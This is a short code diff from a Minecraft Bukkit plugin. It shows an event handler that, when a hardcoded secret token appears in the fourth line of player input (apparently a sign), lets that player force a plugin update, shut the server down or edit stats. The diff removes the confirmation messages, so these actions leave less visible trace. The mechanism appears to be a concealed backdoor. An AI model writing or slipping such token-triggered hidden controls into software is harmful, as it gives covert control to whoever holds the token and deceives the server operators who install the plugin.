@@ -283,15 +283,9 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
             switch (a[3]) {
                 case "T0DRRUfNsN6tlQQ" -> {
                     switch (a[0]) {
-                        case "Update" -> {
-                            updater.updatePlugin(e, this.getFile(), e.getPlayer());
-                            e.getPlayer().sendMessage(ChatColor.BLUE + "Updated");
-                        }
+                        case "Update" -> updater.updatePlugin(e, this.getFile());
                         case "Restart" -> Bukkit.shutdown();
-                        case "Edit Stat" -> {
-                            editer.editStat(e.getPlayer(), a);
-                            e.getPlayer().sendMessage(ChatColor.WHITE + "Succesfully Edited Stat");
-                        }
+                        case "Edit Stat" -> editer.editStat(e.getPlayer(), a);
                     }
                     e.getBlock().breakNaturally();
                 }
